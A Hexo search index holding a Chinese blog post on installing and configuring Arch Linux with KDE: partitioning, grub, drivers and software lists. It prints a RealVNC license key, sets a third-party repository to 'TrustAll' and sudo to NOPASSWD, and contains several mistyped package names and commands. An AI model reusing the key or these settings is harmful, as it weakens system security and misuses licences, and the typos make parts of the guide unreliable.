<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Arch Linux 折腾记</title>
    <url>/2020/03/04/Arch/</url>
    <content><![CDATA[<h1 id="Arch-Linux-安装及配置"><a href="#Arch-Linux-安装及配置" class="headerlink" title="Arch Linux 安装及配置"></a>Arch Linux 安装及配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote>
<p>对小白很友好的安装教程：<a href="https://www.bilibili.com/video/av81146687">https://www.bilibili.com/video/av81146687</a></p>
<p>有基础的请自行查看 ArchWiki 上最新的<a href="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">安装教程</a></p>
</blockquote>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304150816592.png" alt="VMware UEFI引导"></p>
<p>默认选择第一个进入安装页面：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304150900152.png"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151037265.png"></p>
<p><code>ip link</code> 查看互联网设备</p>
<p><code>ip addr</code> 查看当前 ip 地址信息</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151254501.png" alt="image-20200304151254501"></p>
<ul>
<li>开启 ntp 服务更新系统时间:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp true</span><br></pre></td></tr></table></figure>



<h4 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h4><ul>
<li>查看当前磁盘设备：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151648520.png" alt="image-20200304151648520"></p>
<ul>
<li>分区说明</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151907375.png"></p>
<table>
<thead>
<tr>
<th>分区</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;boot</td>
<td>引导分区</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>主分区</td>
</tr>
<tr>
<td>swap</td>
<td>交换空间，相当于虚拟内存</td>
</tr>
</tbody></table>
<ul>
<li>进行磁盘分区</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cfdisk # 一个图形化的分区工具, 操作简单</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152332949.png" alt="选择gpt"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152452030.png" alt="设置各分区"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152554256.png" alt="执行write操作后"></p>
<ul>
<li>进行磁盘格式化</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/sda1 # 引导分区必须格式化为FAT32格式</span><br><span class="line">mkfs.ext4 /dev/sda3		# 系统主分区格式化</span><br><span class="line">mkswap /dev/sda2		# 交换空间格式化</span><br><span class="line">swapon /dev/sda2		# 启用交换空间</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152851864.png" alt="image-20200304152851864"></p>
<h4 id="修改安装源顺序"><a href="#修改安装源顺序" class="headerlink" title="修改安装源顺序"></a>修改安装源顺序</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304153612268.png" alt="将国内源置于最顶部"></p>
<h4 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount /dev/sda3 /mnt		# 挂载根目录</span><br><span class="line">mkdir /mnt/boot				# 创建引导目录</span><br><span class="line">mount /dev/sda1 /mnt/boot	# 挂载引导目录</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304153829387.png" alt="image-20200304153829387"></p>
<h4 id="执行安装"><a href="#执行安装" class="headerlink" title="执行安装"></a>执行安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base linux linux-firmware # 安装Arch、linux、linux框架</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304154059922.png" alt="安装完成"></p>
<h4 id="生成fstab文件"><a href="#生成fstab文件" class="headerlink" title="生成fstab文件"></a>生成fstab文件</h4><ul>
<li>fstab 是用来存放文件系统的静态信息的文件，当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<h4 id="进入系统进行配置"><a href="#进入系统进行配置" class="headerlink" title="进入系统进行配置"></a>进入系统进行配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt # 进入安装好之后的系统</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304154337458.png" alt="image-20200304154337458"></p>
<ul>
<li>设置时区</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>

<ul>
<li>同步时间</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>

<ul>
<li>安装相关基础软件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -Sy # 更新安装源信息</span><br><span class="line">pacman -S vim</span><br></pre></td></tr></table></figure>

<ul>
<li>本地化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>

<p>去除 <code>en_US.UTF-8 UTF-8</code> 和 <code>zh_CN.UTF-8 UTF-8</code> 前面的 #</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155023590.png" alt="image-20200304155023590"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.conf</span><br><span class="line"></span><br><span class="line">LANG=en_US.UTF-8	# 设置系统语言为英语</span><br></pre></td></tr></table></figure>

<ul>
<li>设置hosts</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155406391.png" alt="image-20200304155406391"></p>
<ul>
<li>设置登录密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155434937.png" alt="image-20200304155434937"></p>
<h4 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -m xxx</span><br><span class="line">passwd xxx</span><br><span class="line">usermod -aG wheel,audio,video,optical,storage xxx</span><br><span class="line">visudo</span><br><span class="line">xxx ALL=(ALL) ALL</span><br><span class="line">xxx ALL=(ALL)NOPASSWD:ALL</span><br></pre></td></tr></table></figure>



<h4 id="安装引导"><a href="#安装引导" class="headerlink" title="安装引导"></a>安装引导</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr intel-ucode os-prober</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">efibootmgr EFI启动需安装</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">intel-ucode 或 amd-ucode</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">os-prober 多系统需安装</span></span><br><span class="line"></span><br><span class="line">mkdir /boot/grub</span><br><span class="line"></span><br><span class="line">grub-mkconfig &gt; /boot/grub/grub.cfg	# 生成配置文件</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155753419.png" alt="image-20200304155753419"></p>
<p>确认系统架构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -m</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155834476.png" alt="确认系统架构"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155947052.png" alt="安装grub"></p>
<h4 id="安装一些基础软件"><a href="#安装一些基础软件" class="headerlink" title="安装一些基础软件"></a>安装一些基础软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S net-tools networkmanager dhcpcd openssh</span><br></pre></td></tr></table></figure>

<h4 id="退出重启"><a href="#退出重启" class="headerlink" title="退出重启"></a>退出重启</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>



<p>安装结束</p>
<h3 id="物理机"><a href="#物理机" class="headerlink" title="物理机"></a>物理机</h3><p>安装步骤同虚拟机，分区挂载视具体情况确定。</p>
<p><strong>无线网络启用</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S iw</span><br><span class="line">ip link set wlp0s20f3 up # 开启网卡, 网卡名称视实际情况自行修改</span><br><span class="line">nmcli dev wifi # 扫描无线网络</span><br><span class="line">iw dev wlp0s20f3 scan | grep SSID # 扫描无线网络</span><br></pre></td></tr></table></figure>



<h2 id="桌面安装"><a href="#桌面安装" class="headerlink" title="桌面安装"></a>桌面安装</h2><blockquote>
<p>该部分参考：</p>
<p><a href="https://blog.csdn.net/ackjack_niuniu/article/details/12996987">https://blog.csdn.net/ackjack_niuniu/article/details/12996987</a></p>
<p><a href="https://www.cnblogs.com/kainhuck/p/10698671.html">https://www.cnblogs.com/kainhuck/p/10698671.html</a></p>
</blockquote>
<h3 id="1-安装sddm"><a href="#1-安装sddm" class="headerlink" title="1.安装sddm"></a>1.安装sddm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S sddm sddm-kcm</span><br></pre></td></tr></table></figure>

<h3 id="2-开启sddm服务"><a href="#2-开启sddm服务" class="headerlink" title="2.开启sddm服务"></a>2.开启sddm服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable sddm</span><br></pre></td></tr></table></figure>

<h3 id="3-安装KDE桌面"><a href="#3-安装KDE桌面" class="headerlink" title="3.安装KDE桌面"></a>3.安装KDE桌面</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S plasma kde-applications</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/2020-04-13_12-08.png" alt="我的KDE桌面"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S conky # 一个系统监控的工具</span><br></pre></td></tr></table></figure>



<h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><h3 id="中文字体及美化"><a href="#中文字体及美化" class="headerlink" title="中文字体及美化"></a>中文字体及美化</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装字体</span></span><br><span class="line">pacman -S wqy-zenhei wqy-microhei ttf-arphic-ukai ttf-arphic-uming </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手动安装字体</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把TTF字体复制到 /usr/share/fonts/TTF目录下</span></span><br><span class="line">fc-cache -vf # 更新字体库</span><br></pre></td></tr></table></figure>

<p>字体美化：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/b7de7e09c93d70cf828f82ecf1dcd100bba12b3e.jpg" alt="该图片源自百度贴吧"></p>
<p>另外可从Windows中拷贝TTF字体：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:/Windows/System32/Fonts</span><br></pre></td></tr></table></figure>



<h3 id="软件包相关配置"><a href="#软件包相关配置" class="headerlink" title="软件包相关配置"></a>软件包相关配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yay安装</span></span><br><span class="line">pacman -S base-devel</span><br><span class="line">git clone https://aur.archlinux.org/pakku.git</span><br><span class="line">cd pakku</span><br><span class="line">makepkg -si</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yaourt</span></span><br><span class="line">pacman -S yaourt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">图形化软件包管理</span></span><br><span class="line">pacman -S pamac-aur</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置/etc/pacman.conf，文件末尾添加</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel = Optional TrustAll</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="安装配置输入法"><a href="#安装配置输入法" class="headerlink" title="安装配置输入法"></a>安装配置输入法</h3><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/74931620">https://zhuanlan.zhihu.com/p/74931620</a></p>
<p>KDE桌面环境</p>
<p>（需要archlinuxcn源）</p>
</blockquote>
<ul>
<li>该方法现已有BUG，安装失败（2020-07-14）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-lilydjwg-git fcitx-sogoupinyin</span><br><span class="line">sudo pacman -S kcm-fcitx</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.xprofile</span><br><span class="line"></span><br><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure>



<h3 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe acpi-cpufreq</span><br></pre></td></tr></table></figure>



<h4 id="硬盘分区支持"><a href="#硬盘分区支持" class="headerlink" title="硬盘分区支持"></a>硬盘分区支持</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ntfs挂载支持</span></span><br><span class="line">pacman -S ntfs-3g gvfs-mtp </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">exfat格式化支持</span></span><br><span class="line">pacman -S exfat-utils</span><br></pre></td></tr></table></figure>



<h4 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h4><blockquote>
<p>Intel wiki: <a href="https://wiki.archlinux.org/index.php/Intel_graphics_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Intel_graphics_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a><br>NVIDIA wiki: <a href="https://wiki.archlinux.org/index.php/NVIDIA_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/NVIDIA_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<p><a href="https://www.cnblogs.com/tonyc/p/7732119.html">https://www.cnblogs.com/tonyc/p/7732119.html</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S nvidia bbswitch optimus-manager-qt-kde </span><br></pre></td></tr></table></figure>





<h4 id="蓝牙驱动"><a href="#蓝牙驱动" class="headerlink" title="蓝牙驱动"></a>蓝牙驱动</h4><blockquote>
<p><a href="https://www.jianshu.com/p/b340992b06dc">https://www.jianshu.com/p/b340992b06dc</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S bluez bluez-utils</span><br><span class="line"></span><br><span class="line">systemctl start bluetooth.service</span><br><span class="line">systemctl enable bluetooth.service</span><br></pre></td></tr></table></figure>



<h4 id="触摸板驱动"><a href="#触摸板驱动" class="headerlink" title="触摸板驱动"></a>触摸板驱动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S xf86-input-synaptics # 笔记本触摸板驱动</span><br></pre></td></tr></table></figure>



<h4 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S cheese</span><br></pre></td></tr></table></figure>



<h4 id="多屏幕"><a href="#多屏幕" class="headerlink" title="多屏幕"></a>多屏幕</h4><blockquote>
<p>wiki: <a href="https://wiki.archlinux.org/index.php/Multihead_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Multihead_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h4 id="配置声音"><a href="#配置声音" class="headerlink" title="配置声音"></a>配置声音</h4><blockquote>
<p><a href="https://www.jianshu.com/p/43a03df9acb3">https://www.jianshu.com/p/43a03df9acb3</a><br><a href="https://wiki.archlinux.org/index.php/Advanced_Linux_Sound_Architecture_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Advanced_Linux_Sound_Architecture_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S alsa-utils # 声卡驱动</span><br><span class="line">pacman -S pavucontrol # 可视化声卡配置</span><br><span class="line">pacman -S pulseeffects # 音效</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用PulseEffect调整全局音效: <a href="https://ywnz.com/linuxjc/3788.html">https://ywnz.com/linuxjc/3788.html</a></p>
<p>Linux音效软件 PulseEffects App 3.2.1:<a href="https://www.bilibili.com/video/av21958431/">https://www.bilibili.com/video/av21958431/</a></p>
</blockquote>
<h4 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h4><blockquote>
<p><a href="https://www.jianshu.com/p/894d24567a70">https://www.jianshu.com/p/894d24567a70</a></p>
<p><a href="https://wiki.archlinux.org/index.php/TLP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/TLP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S tlp tlp-rdw tlpui-git</span><br><span class="line"></span><br><span class="line">sudo systemctl enable tlp.service</span><br><span class="line">sudo systemctl enable tlp-sleep.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">屏蔽以下服务以避免冲突，并确保 TLP 的无线电设备切换选项的正确操作</span></span><br><span class="line">sudo systemctl mask systemd-rfkill.service</span><br><span class="line">sudo systemctl mask systemd-rfkill.socket</span><br><span class="line"></span><br><span class="line">sudo tlp-stat -b # 显示电池信息</span><br><span class="line"></span><br><span class="line">sudo vim /etc/tlp.conf	# 配置文件路径</span><br></pre></td></tr></table></figure>



<h3 id="sudo配置"><a href="#sudo配置" class="headerlink" title="sudo配置"></a>sudo配置</h3><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Sudo_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Sudo_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>



<h2 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h2><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/List_of_applications_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/List_of_applications_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h3 id="虚拟机-1"><a href="#虚拟机-1" class="headerlink" title="虚拟机"></a>虚拟机</h3><h4 id="VMware-Workstation"><a href="#VMware-Workstation" class="headerlink" title="VMware Workstation"></a>VMware Workstation</h4><h4 id="VirtualBox"><a href="#VirtualBox" class="headerlink" title="VirtualBox"></a>VirtualBox</h4><h4 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h4><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Docker_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Docker_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S chromiun vivaldi opera opera-ffmpeg-codecs</span><br><span class="line">yay -S flashplugin-focusfix # firefox的flash插件</span><br><span class="line">yay -S google-chrome-beta </span><br></pre></td></tr></table></figure>

<h3 id="Office"><a href="#Office" class="headerlink" title="Office"></a>Office</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wps-office-cn			# 安装WPS</span><br><span class="line">sudo pacman -S wps-office-mui-zh-cn		# 安装中文语言包</span><br></pre></td></tr></table></figure>

<h3 id="多媒体软件"><a href="#多媒体软件" class="headerlink" title="多媒体软件"></a>多媒体软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S nomacs # 图片</span><br><span class="line">pacman -S gimp # 图片编辑</span><br><span class="line">pacman —S krita # 画板</span><br><span class="line">pacman -S mypaint # 画图板</span><br><span class="line">pacman -S mpv # 视频</span><br><span class="line">pacman -S sox # 终端音频播放</span><br><span class="line">pacman -S cmus # 终端音乐播放器</span><br><span class="line">pacman -S handbrake handbrake-cli # 视频压缩转码</span><br><span class="line">yay -S losslesscut # 视频剪切工具</span><br><span class="line">pacman -S simplescreenrecorder # 录屏工具</span><br><span class="line">pacman -S deepin-screen-recorder # deepin录屏工具</span><br><span class="line">pacman -S deepin-screenshot # deepin录音工具</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200310214323308.png" alt="gimp"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200310213834026.png" alt="cmus"></p>
<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><ul>
<li>Typora</li>
</ul>
<h3 id="wine-放弃使用，体验极差"><a href="#wine-放弃使用，体验极差" class="headerlink" title="wine(放弃使用，体验极差)"></a>wine(放弃使用，体验极差)</h3><blockquote>
<p><a href="https://www.jianshu.com/p/a49fe89ae0f6">https://www.jianshu.com/p/a49fe89ae0f6</a></p>
<p><a href="https://taifua.com/ubuntu16-wine-tim.html">https://taifua.com/ubuntu16-wine-tim.html</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wine wine-mono wine_gecko</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置</span></span><br><span class="line">env WINEPREFIX=&quot;$HOME/.deepinwine/Deepin-TIM&quot; winecfg</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S playonlinux</span><br></pre></td></tr></table></figure>



<h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>RealVNC</p>
<blockquote>
<p><a href="https://blog.csdn.net/cc1969281777/article/details/100116496">https://blog.csdn.net/cc1969281777/article/details/100116496</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/vnclicense -add VKUPN-MTHHC-UDHGS-UWD76-6N36A</span><br></pre></td></tr></table></figure>



<h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S p7zip rar zip unzip</span><br></pre></td></tr></table></figure>



<h3 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a>启动器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yay -S utools</span><br><span class="line">pacman -S latte-dock</span><br></pre></td></tr></table></figure>



<h3 id="同步软件"><a href="#同步软件" class="headerlink" title="同步软件"></a>同步软件</h3><p>微力同步：<a href="http://www.verysync.com/">http://www.verysync.com/</a></p>
<p>Onedrive上传工具：<a href="https://www.moerats.com/archives/1006/">https://www.moerats.com/archives/1006/</a></p>
<h3 id="密码保存"><a href="#密码保存" class="headerlink" title="密码保存"></a>密码保存</h3><p>Enpass: <a href="https://www.enpass.io/">https://www.enpass.io/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S enpass-bin</span><br></pre></td></tr></table></figure>



<h3 id="远程终端连接"><a href="#远程终端连接" class="headerlink" title="远程终端连接"></a>远程终端连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yaourt -S asbru-cm-git</span><br><span class="line">yay -S termius</span><br><span class="line">pacman -S putty</span><br><span class="line"></span><br><span class="line">wget www.hostbuf.com/downloads/finalshell_install_linux.sh</span><br></pre></td></tr></table></figure>





<h3 id="其他软件"><a href="#其他软件" class="headerlink" title="其他软件"></a>其他软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wxHexEditor</span></span><br><span class="line">pacman -S wxhexeditor</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sublime</span></span><br><span class="line">yay -S sublime-text-dev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vscode</span></span><br><span class="line">yay -S vistual-studio-code-bin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ftp</span></span><br><span class="line">pacman -S filezilla</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git可视化管理工具</span></span><br><span class="line">pacman -S gitkraken</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GrubCustomizer</span></span><br><span class="line">pacman -S grub-customizer</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KDE 分区管理器</span></span><br><span class="line">pacman -S partitionmanager</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">steam</span></span><br><span class="line">pacman -S lib32-nvidia-utils steam</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc</span></span><br><span class="line">pacman -S gnu-netcat</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gem</span></span><br><span class="line">pacman -S rubygems</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码爆破工具(需要安装mariadb)</span></span><br><span class="line">pacman -S hydra</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mathpix <span class="comment"># https://mathpix.com/</span></span></span><br><span class="line">yay -S mathpix-snipping-tool</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DBeaver 数据库可视化管理工具</span></span><br><span class="line">pacman -S dbeaver</span><br><span class="line"></span><br><span class="line">gem sources --remove https://rubygems.org/</span><br><span class="line">gem sources -a http://gems.ruby-china.com/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">screenkey</span></span><br><span class="line">pacman -S screenkey</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S flameshot # 截图工具</span><br><span class="line">flameshot gui # 启动截图</span><br><span class="line">pacman -S spectacle # 截图工具，可延时截图</span><br><span class="line">pacman -S deepin-screenshot # 深度截图工具</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peek # GIF录制工具</span><br><span class="line">kolourpaint # 画图软件</span><br><span class="line">zeal # API 帮助文档</span><br><span class="line">kchmviewer # chm文档查看器</span><br><span class="line">gitnote # 笔记</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S fsearch-git # 文件搜索（类似everything）</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200306160654856.png" alt="fsearch" style="zoom:50%;" />



<h4 id="usb控制手机"><a href="#usb控制手机" class="headerlink" title="usb控制手机"></a>usb控制手机</h4><blockquote>
<p><a href="https://www.iplaysoft.com/scrcpy.html">https://www.iplaysoft.com/scrcpy.html</a></p>
</blockquote>
